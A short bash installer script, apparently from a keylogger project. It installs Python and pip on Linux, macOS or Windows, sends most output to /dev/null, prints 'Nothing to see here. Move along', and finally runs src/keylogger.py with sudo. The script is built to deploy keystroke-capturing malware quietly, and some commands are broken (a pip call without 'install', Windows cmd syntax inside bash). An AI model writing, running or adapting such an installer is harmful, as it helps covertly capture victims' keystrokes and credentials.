#!/usr/bin/env bash

mypip=pip
mypython=python
noop=">/dev/null 2>&1"

if [[ "$OSTYPE" == "linux-gnu" ]]; then
    {
        echo "Linux Specific instructions"
        sudo apt install python3-pip -y >/dev/null 2>&1
        pip3 install --upgrade pip >/dev/null 2>&1
    } &> /dev/null
    mypip=pip3
    mypython=python3
elif [[ "$OSTYPE" == "darwin" ]]; then
    {
        echo "Mac Specific instructions"
        sudo xcodebuild -license accept >/dev/null 2>&1
        # Python 2.7 is installed by default on Macs
        sudo python -m ensurepip >/dev/null 2>&1
    } &> /dev/null
    mypip=pip
    mypython=python
else
  # Try running Windows stuff
  echo "Nothing to see here. Move along . . ."
  python-3.6.0.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
  set PATH=C:\Program Files\Python 3.6;%PATH%
  mypip=pip3
  mypython=python3
fi

$mypip -r requirements.txt
sudo $mypython src/keylogger.py
